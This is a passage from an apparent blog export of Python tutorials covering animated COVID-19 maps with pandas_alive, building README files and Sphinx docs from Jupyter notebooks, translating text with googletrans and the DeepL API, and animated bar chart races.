postcode_dataset = postcode_dataset [ postcode_dataset [ 'Latitude' ] . notna ()] postcode_dataset = postcode_dataset [ postcode_dataset [ 'Latitude' ] != 0 ] postcode_dataset [ 'Postcode' ] = postcode_dataset [ 'Postcode' ] . astype ( str ) # Build GeoDataFrame from Lat Long dataset and make map chart grouped_df [ 'Longitude' ] = grouped_df . index . map ( postcode_dataset . set_index ( 'Postcode' )[ 'Longitude' ] . to_dict ()) grouped_df [ 'Latitude' ] = grouped_df . index . map ( postcode_dataset . set_index ( 'Postcode' )[ 'Latitude' ] . to_dict ()) gdf = geopandas . GeoDataFrame ( grouped_df , geometry = geopandas . points_from_xy ( grouped_df . Longitude , grouped_df . Latitude ), crs = \"EPSG:4326\" ) gdf = gdf . dropna () # Prepare GeoDataFrame for writing to geopackage gdf = gdf . drop ([ 'Longitude' , 'Latitude' ], axis = 1 ) gdf . columns = gdf . columns . astype ( str ) gdf [ 'postcode' ] = gdf . index gdf . to_file ( \"data/nsw-covid19-cases-by-postcode.gpkg\" , layer = 'nsw-postcode-covid' , driver = \"GPKG\" ) Before we merge together all the charts, let's plot the prepared geospatial data on it's own. In [6]: # Prepare GeoDataFrame for plotting gdf . index = gdf . postcode gdf = gdf . drop ( 'postcode' , axis = 1 ) gdf = gdf . to_crs ( \"EPSG:3857\" ) #Web Mercator map_chart = gdf . plot_animated ( filename = 'map-chart.gif' , title = \"Cases by Location\" , basemap_format = { 'source' : contextily . providers . Stamen . Terrain }, cmap = 'cool' ) Finally let's merge all these charts together into a single chart! In [7]: grouped_df = pd . read_csv ( 'data/nsw-covid-cases-by-postcode.csv' , index_col = 0 , parse_dates = [ 0 ]) line_chart = ( grouped_df . sum ( axis = 1 ) . cumsum () . fillna ( 0 ) . plot_animated ( kind = \"line\" , period_label = False , title = \"Cumulative Total Cases\" ) ) def current_total ( values ): total = values . sum () s = f 'Total : { int ( total ) } ' return { 'x' : . 85 , 'y' : . 2 , 's' : s , 'ha' : 'right' , 'size' : 11 } race_chart = grouped_df . cumsum () . plot_animated ( n_visible = 5 , title = \"Cases by Postcode\" , period_label = False , period_summary_func = current_total ) import time timestr = time . strftime ( \" %d /%m/%Y\" ) plots = [ bar_chart , line_chart , map_chart , race_chart ] from matplotlib import rcParams rcParams . update ({ \"figure.autolayout\" : False }) figs = plt . figure () gs = figs . add_gridspec ( 2 , 3 , hspace = 0.5 ) f3_ax1 = figs . add_subplot ( gs [ 0 , :]) f3_ax1 . set_title ( bar_chart . title ) bar_chart . ax = f3_ax1 f3_ax2 = figs . add_subplot ( gs [ 1 , 0 ]) f3_ax2 . set_title ( line_chart . title ) line_chart . ax = f3_ax2 f3_ax3 = figs . add_subplot ( gs [ 1 , 1 ]) f3_ax3 . set_title ( map_chart . title ) map_chart . ax = f3_ax3 f3_ax4 = figs . add_subplot ( gs [ 1 , 2 ]) f3_ax4 . set_title ( race_chart . title ) race_chart . ax = f3_ax4 timestr = cases_df . index . max () . strftime ( \" %d /%m/%Y\" ) figs . suptitle ( f \"NSW COVID-19 Confirmed Cases up to { timestr } \" ) pandas_alive . animate_multiple_plots ( 'nsw-covid.gif' , plots , figs ) Generating LineChart, plotting ['0'] Generating BarChartRace, plotting ['1871', '2000', '2007', '2008', '2009', '2010', '2011', '2015', '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023', '2024', '2025', '2026', '2027', '2028', '2029', '2030', '2031', '2032', '2033', '2034', '2035', '2036', '2037', '2038', '2039', '2040', '2041', '2042', '2043', '2044', '2045', '2046', '2047', '2048', '2049', '2050', '2060', '2061', '2062', '2063', '2064', '2065', '2066', '2067', '2068', '2069', '2070', '2071', '2072', '2073', '2074', '2075', '2076', '2077', '2079', '2080', '2081', '2084', '2085', '2086', '2087', '2088', '2089', '2090', '2091', '2092', '2093', '2094', '2095', '2096', '2097', '2099', '2100', '2101', '2102', '2103', '2104', '2106', '2107', '2108', '2110', '2111', '2112', '2113', '2114', '2115', '2116', '2117', '2118', '2119', '2120', '2121', '2122', '2125', '2126', '2127', '2128', '2130', '2131', '2132', '2134', '2135', '2137', '2138', '2140', '2141', '2142', '2144', '2145', '2147', '2148', '2150', '2151', '2152', '2153', '2154', '2155', '2156', '2158', '2159', '2160', '2161', '2162', '2163', '2164', '2165', '2166', '2168', '2170', '2171', '2172', '2173', '2176', '2177', '2178', '2179', '2190', '2191', '2192', '2193', '2194', '2195', '2196', '2197', '2198', '2199', '2200', '2203', '2204', '2205', '2206', '2207', '2208', '2209', '2210', '2211', '2212', '2213', '2216', '2217', '2218', '2219', '2220', '2221', '2223', '2224', '2225', '2226', '2227', '2228', '2229', '2230', '2231', '2232', '2233', '2234', '2250', '2251', '2256', '2257', '2258', '2259', '2260', '2261', '2262', '2263', '2264', '2265', '2278', '2280', '2281', '2282', '2283', '2284', '2285', '2286', '2287', '2289', '2290', '2291', '2292', '2297', '2298', '2299', '2300', '2303', '2304', '2305', '2306', '2315', '2316', '2317', '2318', '2319', '2320', '2321', '2322', '2323', '2324', '2325', '2327', '2330', '2333', '2334', '2335', '2337', '2340', '2343', '2345', '2350', '2357', '2358', '2360', '2371', '2372', '2380', '2400', '2420', '2421', '2422', '2423', '2425', '2427', '2428', '2430', '2431', '2439', '2440', '2443', '2444', '2445', '2446', '2447', '2448', '2450', '2452', '2454', '2456', '2460', '2463', '2464', '2465', '2470', '2476', '2477', '2478', '2479', '2480', '2481', '2482', '2483', '2484', '2485', '2486', '2487', '2490', '2500', '2505', '2506', '2508', '2515', '2516', '2517', '2518', '2519', '2525', '2526', '2527', '2528', '2529', '2530', '2533', '2535', '2536', '2537', '2539', '2540', '2541', '2546', '2548', '2550', '2557', '2558', '2560', '2564', '2565', '2566', '2567', '2568', '2569', '2570', '2571', '2575', '2576', '2577', '2578', '2580', '2581', '2582', '2583', '2586', '2590', '2619', '2620', '2621', '2627', '2628', '2630', '2631', '2640', '2641', '2642', '2643', '2644', '2646', '2647', '2650', '2660', '2680', '2700', '2711', '2713', '2714', '2716', '2722', '2745', '2747', '2748', '2749', '2750', '2752', '2753', '2754', '2756', '2757', '2758', '2759', '2760', '2761', '2763', '2765', '2766', '2767', '2768', '2769', '2770', '2773', '2774', '2777', '2779', '2780', '2782', '2783', '2785', '2786', '2790', '2795', '2799', '2800', '2810', '2820', '2821', '2824', '2830', '2843', '2849', '2850', '2865', '2866', '2870', '2880', '9999'] Pandas_Alive also supports animating polygon GeoDataFrames! In [ ]: import geopandas import pandas_alive import contextily gdf = geopandas . read_file ( 'data/italy-covid-region.gpkg' ) gdf . index = gdf . region gdf = gdf . drop ( 'region' , axis = 1 ) map_chart = gdf . plot_animated ( filename = 'examples/example-geo-polygon-chart.gif' , basemap_format = { 'source' : contextily . providers . Stamen . Terrain }) In [ ]:","tags":"Python","url":"https://jackmckew.dev/geopandas-and-pandas-alive.html","loc":"https://jackmckew.dev/geopandas-and-pandas-alive.html"},{"title":"Make a README & Documentation with Jupyter Notebooks","text":"README is typically the front page of a project, and should contain relevant information for current users & prospective users. As to make sure documentation across a project is consistent as well, imagine if we could include this README that is the front page of our project, both on the repository, and in the documentation. This post goes into how to set this workflow up. Find a live example of this being implemented on: https://github.com/JackMcKew/pandas_alive . A good starting structure for a project's README is: Intro - A short description & output (if applicable) of the project. Usage - A section on how the project is to be used (if applicable). Documentation - Link to documentation for the project. Contributing Guidelines - If this is an open source project, a note whether contributions are welcome & instructions how to get involved is well received. Changelog - Keeping a changelog of what is changing as the project evolves. Other useful sections when applicable are requirements, future plans and inspiration. Inspiration for This Post The inspiration for this post also comes from Pandas_Alive , wherein there is working examples with output hosted on the README. Initially, this was contained in a generate_examples.py file and as the package evolved, the code to match the examples, was being copied over into code blocks in the README.md . If you can see where this is going, obviously whenever some new examples were made, the code to generate the examples was being forgotten to be copied over. This is very frustrating for new users to the package, as the examples simply don't work. Thus the workflow we go into in this post was adopted. README.ipynb In projects, typically it's best practice to not have to repeat yourself in multiple places (this the DRY principle). In the README, it's nice to have working examples on how a user may use the project. If we could tie the original README with live code that generates the examples, that would be ideal, enter README.ipynb . Jupyter supports markdown & code cells, thus all the current documentation in the README.md can be copied within markdown cells. Similarly, the code used to generate examples or demonstrate usage can then be placed in code cells. Allowing the author, to run the entire notebook, generating the new examples & verifying the examples are working code. Fantastic, this is exactly where we want to go. Now if you only have the README.ipynb in the repository, GitHub will represent the file in it's raw form, JSON. For example would be hundreds of line like: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 { \"cells\" : [ { \"cell_type\" : \"markdown\" , \"metadata\" : {}, \"source\" : [ \"# Pandas_Alive\\n\" , \"\\n\" , \"Animated plotting extension for Pandas with Matplotlib\\n\" , \"\\n\" , \"**Pandas_Alive** is intended to provide a plotting backend for animated [matplotlib](https://matplotlib.org/) charts for [Pandas](https://pandas.pydata.org/) DataFrames, similar to the already [existing Visualization feature of Pandas](https://pandas.pydata.org/pandas-docs/stable/visualization.html).\\n\" , \"\\n\" , \"With **Pandas_Alive**, creating stunning, animated visualisations is as easy as calling:\\n\" , \"\\n\" , \"`df.plot_animated()`\\n\" , \"\\n\" , \"![Example Bar Chart](examples/example-barh-chart.gif)\" ] This is not ideal whatsoever, this is nowhere near as attractive as the nicely rendered README.md . Enter nbconvert . README.ipynb -> README.md with nbconvert nbconvert is a package built to convert Jupyter notebooks to other formats and can be installed similar to jupyter (eg, pip install jupyter , pip install nbconvert ). See the documentation at: https://nbconvert.readthedocs.io/en/latest/ . Now let's check the supported output types for nbconvert : HTML, LaTeX, PDF, Reveal.js HTML slideshow, Markdown, Ascii, reStructuredText, executable script, notebook. nbconvert supports Markdown! Fantastic, we can add this step into our CI process (eg, GitHub Action ). This will allow us to generate a new README.md whenever our README.ipynb changes. In Pandas_Alive, we clear the output output of the cells in README.ipynb with the flags: jupyter nbconvert --ClearMetadataPreprocessor.enabled=True --ClearOutput.enabled=True --to markdown README.ipynb . Python Highlighting in Output When first run, it was noticed that nbconvert wasn't marking the code blocks with the language (python). This is required to highlight the code blocks in the README.md with language specifics. The workaround for this, was to use nbconvert 's support for custom templates. See the docs at: https://nbconvert.readthedocs.io/en/latest/customizing.html#Custom-Templates . The resulting template \"pythoncodeblocks.tpl\" was: 1 2 3 4 5 6 {% extends 'markdown.tpl' %} {% block codecell %} ``` python {{cell.source}} ``` {% endblock codecell %} Which could be used with nbconvert with: 1 jupyter nbconvert --template \"pythoncodeblocks.tpl\" --to markdown README.ipynb Integration into Documentation with Sphinx If you haven't already, check out my previous post Automatically Generate Documentation with Sphinx . The post goes into detail on how to implement Sphinx as to generate all of the documentation for a project from docstrings automatically. Before going on, the live site of the documentation in reference can be reached at: https://jackmckew.github.io/pandas_alive/ Now, we've: Stored our working code & documentation for a our project's front page in a Jupyter notebook README.ipynb Converted README.ipynb into markdown format with nbconvert Inserted language specific (python) into the code blocks within the markdown The next step is to make the README content also live in the documentation. Since Sphinx relies on reStructuredText format, so we'll need to convert README.md to README.rst . Enter m2r , a markdown to reStructuredText converter. nbconvert could be used in this step over m2r , in saying that this step was originally developed prior to the README.ipynb being created, thus only README.md existed. Please drop a comment if you try using nbconvert over m2r for this step and your results! Firstly, m2r can be installed with pip ( pip install m2r ) and we can convert README.md with the command m2r README.md which will generate README.rst in the same directory. Now we need to include our README.rst in the documentation. After much tweaking, the documentation structure set up landed upon for Pandas_Alive, with use of autosummary to automatically generate documentation from docstrings was: Autosummary generated documentation is included within a separate rst file (developer.rst) to nest all the generated with autosummary within one heading with the ReadTheDocs theme index.rst 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 .. module :: pandas_alive Pandas_Alive |version| ======================================== Animated plotting extension for Pandas with Matplotlib :mod: `Pandas_alive` is intended to provide a plotting backend for animated matplotlib charts for Pandas DataFrames, similar to the already existing Visualization feature of Pandas. With :mod: `Pandas_alive` , creating stunning, animated visualisations is as easy as calling: ``df.plot_animated()`` .. image :: ../../examples/example-barh-chart.gif :target: examples/example-barh-chart.gif :alt: Example Bar Chart .. toctree :: :caption: Getting Started Installation & Examples <README> .. toctree :: :caption: Developers developer .. rubric :: Modules Indices and tables ================== * :ref: `genindex` * :ref: `modindex` * :ref: `search` developer.rst 1 2 3 4 5 6 7 8 9 10 11 12 API Reference ============= .. autosummary :: :toctree: generated pandas_alive.plotting.plot pandas_alive.plotting pandas_alive.base pandas_alive._base_chart pandas_alive.charts pandas_alive.__init__ conf.py Integration with GitHub Actions All the steps above mentioned are currently being used to maintain the project Pandas_Alive. Find the GitHub Action yml files at: https://github.com/JackMcKew/pandas_alive/tree/master/.github/workflows Find the Sphinx configuration files at: https://github.com/JackMcKew/pandas_alive/tree/master/docs","tags":"Python","url":"https://jackmckew.dev/make-a-readme-documentation-with-jupyter-notebooks.html","loc":"https://jackmckew.dev/make-a-readme-documentation-with-jupyter-notebooks.html"},{"title":"Translating Text in Python","text":"Massive thank you to Chema, who translated this article himself into Spanish! Check it out at: https://www.ibidemgroup.com/edu/traduccion-automatica-texto-python/ Working with data in a connected digital world, means you will possibly encounter data in a language outside your own. In this post we'll go into ways to translate this data in Python. First off we need some sample text, and what is better to read about then pizza! In [1]: # Source: http://saberitaliano.com.ar/reading/pizza.html sample_text_it = \"\"\"La pizza Ã¨ un prodotto gastronomico che ha per base un impasto di acqua, farina di frumento, e lievito, lavorato fino a ottenere una forma piatta, cotto al forno e variamente condito. BenchÃ© si tratti ormai di un prodotto diffuso in quasi tutto il mondo, la pizza Ã¨ generalmente considerata un piatto originario della cucina italiana ed in particolar modo napoletana. Nel sentire comune, infatti, ci si riferisce con questo termine alla pizza tonda condita con pomodoro e mozzarella, ossia la variante piÃ¹ conosciuta della cosiddetta pizza napoletana. La vera e propria origine della pizza Ã¨ tuttavia argomento controverso: oltre a Napoli, altre cittÃ  ne rivendicano la paternitÃ . Esiste, del resto, anche un significato piÃ¹ ampio del termine \"pizza\". Infatti, trattandosi in ultima analisi di una particolare specie di pane o focaccia, la pizza si presenta in innumerevoli derivazioni e varianti, cambiando nome e caratteristiche a seconda delle diverse tradizioni locali. In particolare, in alcune aree dell'Italia centrale, viene chiamata \"pizza\" qualsiasi tipo di torta cotta al forno, salata o dolce e alta o bassa che sia.\"\"\" Note that we use triple quotes to contain this string, because this is a multiline string. Care must be taken when using triple quotes, as these strings will also contain special characters such as newline, tabs and more. Google Translate API - Free! If you've ever needed to translate anything from a language that you didn't know, chances are you've used Google Translate. It's almost magic how well this software performs, and the features it boasts are nothing short of amazing. On top of all of this, they offer a free API that we can access directly from our code! While there is some limitations, this is still an amazing start and if the program isn't required to translate mass amounts of text, this would be a straightforward solution. To make this even simpler in Python, there is a package aptly named googletrans , which interfaces with the Google Translate API for us https://pypi.org/project/googletrans/ . Let's begin by importing the package, and seeing what languages are supported. In [2]: import googletrans print ( googletrans . LANGUAGES ) {'af': 'afrikaans', 'sq': 'albanian', 'am': 'amharic', 'ar': 'arabic', 'hy': 'armenian', 'az': 'azerbaijani', 'eu': 'basque', 'be': 'belarusian', 'bn': 'bengali', 'bs': 'bosnian', 'bg': 'bulgarian', 'ca': 'catalan', 'ceb': 'cebuano', 'ny': 'chichewa', 'zh-cn': 'chinese (simplified)', 'zh-tw': 'chinese (traditional)', 'co': 'corsican', 'hr': 'croatian', 'cs': 'czech', 'da': 'danish', 'nl': 'dutch', 'en': 'english', 'eo': 'esperanto', 'et': 'estonian', 'tl': 'filipino', 'fi': 'finnish', 'fr': 'french', 'fy': 'frisian', 'gl': 'galician', 'ka': 'georgian', 'de': 'german', 'el': 'greek', 'gu': 'gujarati', 'ht': 'haitian creole', 'ha': 'hausa', 'haw': 'hawaiian', 'iw': 'hebrew', 'hi': 'hindi', 'hmn': 'hmong', 'hu': 'hungarian', 'is': 'icelandic', 'ig': 'igbo', 'id': 'indonesian', 'ga': 'irish', 'it': 'italian', 'ja': 'japanese', 'jw': 'javanese', 'kn': 'kannada', 'kk': 'kazakh', 'km': 'khmer', 'ko': 'korean', 'ku': 'kurdish (kurmanji)', 'ky': 'kyrgyz', 'lo': 'lao', 'la': 'latin', 'lv': 'latvian', 'lt': 'lithuanian', 'lb': 'luxembourgish', 'mk': 'macedonian', 'mg': 'malagasy', 'ms': 'malay', 'ml': 'malayalam', 'mt': 'maltese', 'mi': 'maori', 'mr': 'marathi', 'mn': 'mongolian', 'my': 'myanmar (burmese)', 'ne': 'nepali', 'no': 'norwegian', 'ps': 'pashto', 'fa': 'persian', 'pl': 'polish', 'pt': 'portuguese', 'pa': 'punjabi', 'ro': 'romanian', 'ru': 'russian', 'sm': 'samoan', 'gd': 'scots gaelic', 'sr': 'serbian', 'st': 'sesotho', 'sn': 'shona', 'sd': 'sindhi', 'si': 'sinhala', 'sk': 'slovak', 'sl': 'slovenian', 'so': 'somali', 'es': 'spanish', 'su': 'sundanese', 'sw': 'swahili', 'sv': 'swedish', 'tg': 'tajik', 'ta': 'tamil', 'te': 'telugu', 'th': 'thai', 'tr': 'turkish', 'uk': 'ukrainian', 'ur': 'urdu', 'uz': 'uzbek', 'vi': 'vietnamese', 'cy': 'welsh', 'xh': 'xhosa', 'yi': 'yiddish', 'yo': 'yoruba', 'zu': 'zulu', 'fil': 'Filipino', 'he': 'Hebrew'} Next we need to create an instance of the translator class within googletrans . Another feature of Google Translate, is that it can automatically detect the language that the text is in, and we can use this feature in our code too! This is straightforward by passing our string to the method translator.detect() . This will return an instance of a class named Detected , in which we can see the detected language and how confident the package is in it's prediction. In [3]: translator = googletrans . Translator () print ( translator . detect ( sample_text_it )) Detected(lang=it, confidence=1.0) Now time to get translating! Once again, a straightforward method of translator.translate() is used by passing the string. We can also define the source & destination language to translate to. This returns an instance of the Translated class containing attributes of: src - The source language to translate from dest - The destination language to translate to text - The translated text origin - The original text pronunciation - How to pronounce the translated text (although this only returns None in my experience) In [4]: translated = translator . translate ( sample_text_it , src = 'it' , dest = 'en' ) print ( translated ) Translated(src=it, dest=en, text=The pizza is a gourmet product that has as its base a mixture of water, wheat flour, and yeast, worked up to obtain a flat shape, baked and variously seasoned. Although it now is a widespread product in almost all over the world, pizza is generally considered an original dish of Italian cuisine and especially Neapolitan way. In common feeling, in fact, we are referring to with this term round pizza topped with tomato sauce and mozzarella, which is the most well-known variant of the so-called Neapolitan pizza. The real origin of pizza, however, is controversial: in addition to Naples, other cities claim its paternity. There is, moreover, also a broader meaning of the term \"pizza\". In fact, since in the final analysis of a particular kind of bread or focaccia, pizza presents itself in countless derivations and variations, changing name and characteristics depending on the different local traditions. In particular, in some areas of central Italy, it is called \"pizza\" any type of baked cake baked, salty or sweet, high or low it is., pronunciation=None, extra_data=\"{'translat...\") What if we had many strings that needed translating? Let's start by breaking our sample text into sections with the method str.splitlines() , this will create a list of each string that is separate by a newline (separate paragraphs). We use the filter() function to rid the list of empty strings for neatness sake In [5]: sentence_list = sample_text_it . splitlines () # Remove empty strings sentence_list = list ( filter ( None , sentence_list )) print ( sentence_list ) ['La pizza Ã¨ un prodotto gastronomico che ha per base un impasto di acqua, farina di frumento, e lievito, lavorato fino a ottenere una forma piatta, cotto al forno e variamente condito.', 'BenchÃ© si tratti ormai di un prodotto diffuso in quasi tutto il mondo, la pizza Ã¨ generalmente considerata un piatto originario della cucina italiana ed in particolar modo napoletana. Nel sentire comune, infatti, ci si riferisce con questo termine alla pizza tonda condita con pomodoro e mozzarella, ossia la variante piÃ¹ conosciuta della cosiddetta pizza napoletana.', 'La vera e propria origine della pizza Ã¨ tuttavia argomento controverso: oltre a Napoli, altre cittÃ  ne rivendicano la paternitÃ . Esiste, del resto, anche un significato piÃ¹ ampio del termine \"pizza\". Infatti, trattandosi in ultima analisi di una particolare specie di pane o focaccia, la pizza si presenta in innumerevoli derivazioni e varianti, cambiando nome e caratteristiche a seconda delle diverse tradizioni locali. In particolare, in alcune aree dell\\'Italia centrale, viene chiamata \"pizza\" qualsiasi tipo di torta cotta al forno, salata o dolce e alta o bassa che sia.'] Let's create a function to handle the translation step. We instantiate a new translator each time the function is called, this also helps to reinitalise the Google Translate API on each time we translate. If the src_lang isn't defined the function call, let's use the magical method translator.detect() to make a prediction for us. Now we iterate over the list, calling our new function repeatedly and finally appending the translated data into a new list translated_list . In [6]: def translate_text ( text : str , src_lang : str = None , dest_lang : str = \"en\" ): translator = googletrans . Translator () if src_lang is None : src_lang = translator . detect ( text ) . lang return translator . translate ( text , src = src_lang , dest = dest_lang ) . text translated_list = [] for sentence in sentence_list : translated_list . append ( translate_text ( sentence )) print ( translated_list ) ['The pizza is a gourmet product that has as its base a mixture of water, wheat flour, and yeast, worked up to obtain a flat shape, baked and variously seasoned.', 'Although it now is a widespread product in almost all over the world, pizza is generally considered an original dish of Italian cuisine and especially Neapolitan way. In common feeling, in fact, we are referring to with this term round pizza topped with tomato sauce and mozzarella, which is the most well-known variant of the so-called Neapolitan pizza.', 'The real origin of pizza, however, is controversial: in addition to Naples, other cities claim its paternity. There is, moreover, also a broader meaning of the term \"pizza\". In fact, since in the final analysis of a particular kind of bread or focaccia, pizza presents itself in countless derivations and variations, changing name and characteristics depending on the different local traditions. In particular, in some areas of central Italy, it is called \"pizza\" any type of baked cake baked, salty or sweet, high or low it is.'] DeepL Translator Sometimes we need to translate much larger datasets. I recently faced this problem while volunteering for a COVID-19 project in which we wanted to run analysis on the tweets of Italy during the pandemic. We were supplied with millions of tweets over weeks in May 2020, all in Italian. As most of the team only spoke English, and as far as we knew sentiment analysis was developed for English extensively; we would need to translate all of this data. While Google Translate can be paid for, we were kindly donated an API key from the DeepL team for our cause. Following this, will be how the team & I set up the mass translator with pandas , requests and the DeepL Translator API. As to not share the donated API key, responses from the DeepL translator will not be shown in this post. Firstly, we will initialise our sample text (split by paragraph) from before, in a pandas DataFrame to represent our mass datasets. In [7]: import pandas as pd import numpy as np import requests import json In [8]: source_text_df = pd . DataFrame ( sentence_list , columns = [ \"Source Text\" ]) source_text_df Out[8]: .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Source Text 0 La pizza Ã¨ un prodotto gastronomico che ha per... 1 BenchÃ© si tratti ormai di un prodotto diffuso ... 2 La vera e propria origine della pizza Ã¨ tuttav... Now that we have our data arranged in a pandas DataFrame , we create a function for interfacing with the DeepL Translator API. The documentation for the DeepL Translator API is fantastic, and can be reached at https://www.deepl.com/docs-api/introduction/ . Using build our request as a dictionary to be used with the requests package. Read more details about how payloads are formatted in the requests documentation . The response back from DeepL is then in the JSON format, which we can then convert back into a dictionary with the response.json() method. Finally we loop through the returned response, and reconstruct a list of the translated data to return from the function. In [9]: def translate_text_deepl ( data , api_key , src_lang : str = \"IT\" , target_lang : str = \"EN\" ): # Create empty list translated_list = [] try : # Translate all tweets and add to list # Request should not exceed 30KB parameters = { \"text\" : data , \"source_lang\" : src_lang , \"target_lang\" : target_lang , \"auth_key\" : api_key , } response = requests . get ( \"https://api.deepl.com/v2/translate\" , params = parameters ) deepl_response_data = response . json () for item in deepl_response_data . values (): for key in item : translated_list . append ( key [ \"text\" ]) except json . decoder . JSONDecodeError : # Insert error for each line in data for _ in data : translated_list . append ( \"Error\" ) print ( f \"Error translating.. `Error` placed in output dataset\" ) return translated_list Now that we have our function that interfaces with the DeepL Translator API, we can use this to translate all of our data easily by calling the function, that's it, done! The output shows Error due to the API Key not being valid In [10]: source_text_df [ 'Translated Text' ] = translate_text_deepl ( source_text_df [ 'Source Text' ], \"APIKEY\" , \"IT\" , \"EN\" ) Error translating.. `Error` placed in output dataset If the DataFrame is much larger in size, we may need to process this data in chunks. This can be done by using our new translate_text_deepl function from a different perspective. Similarly we create a new list to store all of our translated data, and add in new data iteratively in chunks in our DataFrame. Chunks can be iterated through a DataFrame using the groupby method, along with with arange function in numpy . The output shows Error due to the API Key not being valid In [11]: all_translated_data = [] chunk_size = 2 for _ , chunk in source_text_df . groupby ( np . arange ( len ( source_text_df )) // chunk_size ): # Add new data to list # We use extend as the function returns a list all_translated_data . extend ( translate_text_deepl ( chunk [ 'Source Text' ], \"APIKEY\" , \"IT\" , \"EN\" )) source_text_df [ 'Translated Text' ] = all_translated_data Error translating.. `Error` placed in output dataset Error translating.. `Error` placed in output dataset","tags":"Data Science","url":"https://jackmckew.dev/translating-text-in-python.html","loc":"https://jackmckew.dev/translating-text-in-python.html"},{"title":"Creating Animated Plots with Pandas_Alive","text":"In this tutorial we'll learn how to create a series of animations using Pandas_Alive. This post is rendered in the style of a Jupyter Notebook. Find the source here: https://github.com/JackMcKew/jackmckew.dev/tree/master/content/2020/pandas_alive/notebooks/pandas_alive_demo.ipynb . Pandas_Alive was created by me! I set out to develop this package to build a very specific data visualisation, which is also apart of a prior blog post which you can see at: https://jackmckew.dev/covid-19-confirmed-cases-nsw-australia-animated-statistics-over-time.html pandas_alive python package pandas_alive is a python package that automates the process of making these animations. Head over to the github repository to see even more examples! Installation Install with pip install pandas_alive Supported Chart Types See the README on GitHub for current chart types at https://github.com/JackMcKew/pandas_alive#currently-supported-chart-types At the time of writing the currently supported chart types are: Horizontal Bar Chart Races Vertical Bar Chart Races Line Charts Scatter Charts Pie Charts Requirements pandas_alive utilises the matplotlib.animation function , thus requiring a writer library. Ensure to have one of the supported tooling software installed prior to use! ffmpeg ImageMagick Pillow See more at https://matplotlib.org/3.2.1/api/animation_api.html#writer-classes Bar Chart Race Firstly let's build a bar chart race of the population change by year in all the countries of the world. Once pandas_alive is installed with pip install pandas_alive , we import the package, along with pandas . In [1]: import pandas_alive import pandas as pd Next we need to import the data! We do the following steps: Using pandas , we can read the data into a DataFrame using pd.read_csv , ensuring to use the keyword parse_dates on the Year column in our dataset. Next we rename the columns to make life easier. We're only interested in years 1800 onwards, so we can make a selection and drop the data that isn't on or after the year 1800. Finally we convert the 'Year' column into datetime format, read more about datetime format here: https://docs.python.org/3/library/datetime.html In [2]: # Data Source: https://ourworldindata.org/grapher/population-by-country df = pd . read_csv ( 'population-by-country.csv' , parse_dates = [ 'Year' ]) # Rename columns column_names = [ 'Country' , 'Country Code' , 'Year' , 'Population' ] df . columns = column_names # Only years from 1800 onwards df = df [ df [ 'Year' ] . astype ( int ) >= 1800 ] # Convert Year column to datetime df [ 'Year' ] = pd . to_datetime ( df [ 'Year' ]) display ( df ) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Country Country Code Year Population 3 Afghanistan AFG 1800-01-01 3280000.0 4 Afghanistan AFG 1820-01-01 3280000.0 5 Afghanistan AFG 1850-01-01 3750000.0 6 Afghanistan AFG 1870-01-01 4207000.0 7 Afghanistan AFG 1900-01-01 5000000.0 ... ... ... ... ... 3216 Zimbabwe ZWE 1960-01-01 3751000.0 3217 Zimbabwe ZWE 1970-01-01 5514536.0 3218 Zimbabwe ZWE 1980-01-01 7169968.0 3219 Zimbabwe ZWE 1990-01-01 10156000.0 3220 Zimbabwe ZWE 2000-01-01 11820000.0 2923 rows Ã— 4 columns As we can see, our data is currently in a 'long' format; where each row is one time point per subject. Meaning each row (country) will have data in multiple rows. pandas_alive requires the data to be in a 'wide' format, where: Each row represents a single point/period in time Each column holds the value for a particular category (country in this case) The index contains the time component (optional, if not used ensure to use interpolate_period=False ) To convert our data from 'long' to 'wide' format, we can use the pandas function pivot to achieve this! For any missing data we fill this with 0 using .fillna(0) In [3]: # Pivot data to turn from `long` to `wide` format pivoted_df = df . pivot ( index = 'Year' , columns = 'Country' , values = 'Population' ) . fillna ( 0 ) display ( pivoted_df . head ( 5 )) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Country Afghanistan Albania Algeria Andorra Angola Antigua and Barbuda Argentina Armenia Australia Austria ... United Kingdom United States Uruguay Uzbekistan Vanuatu Venezuela Vietnam Yemen Zambia Zimbabwe Year 1800-01-01 3280000.0 400000.0 2500000.0 2654.0 1567028.0 37000.0 534000.0 413326.0 200000.0 3000000.0 ... 10750000.0 6000000.0 55000.0 1919159.0 27791.0 1000000.0 4000000.0 2593000.0 747000.0 1085814.0 1810-01-01 0.0 0.0 0.0 0.0 0.0 0.0 406000.0 0.0 0.0 0.0 ... 11970000.0 7240000.0 0.0 0.0 0.0 802000.0 0.0 0.0 0.0 0.0 1820-01-01 3280000.0 437000.0 2689000.0 2654.0 1567028.0 0.0 534000.0 413326.0 334000.0 3369000.0 ... 21239000.0 9980510.2 55000.0 1919159.0 27791.0 718000.0 6551000.0 2593000.0 0.0 1085814.0 1830-01-01 0.0 0.0 0.0 0.0 0.0 0.0 634000.0 0.0 330000.0 3538000.0 ... 24139000.0 13240313.9 0.0 0.0 0.0 887000.0 0.0 0.0 0.0 0.0 1840-01-01 0.0 0.0 0.0 0.0 0.0 0.0 768000.0 0.0 420000.0 3716000.0 ... 26745000.0 17443768.0 0.0 0.0 0.0 1219000.0 0.0 0.0 0.0 0.0 5 rows Ã— 190 columns Now that our data is prepared in 'wide' format, we're ready to create the animation! Ensuring that pandas_alive has been imported, we can now call .plot_animated() on our DataFrame. If a filename is passed, along with an extension (eg, .mp4, .gif), pandas_alive will export the animation to a file. Otherwise, pandas_alive creates an instance of the animation for use in pandas_alive.animate_multiple_plots() . We can configure settings of .plot_animated , such as: n_visible - Change the number of visible bars on the plot period_fmt - Change the way the date is represented on the plot (eg, '%d/%m/%Y') title - Set a title for the plot fixed_max - Set the x-axis to be fixed from the lowest - biggest number perpendicular_bar_func - Set the function to show a perpendicular bar (eg 'mean', 'min','max', custom function, etc) There are many more settings which you can read more over at the documentation: https://jackmckew.github.io/pandas_alive/generated/pandas_alive.plotting.plot.html#pandas_alive.plotting.plot In [ ]: # 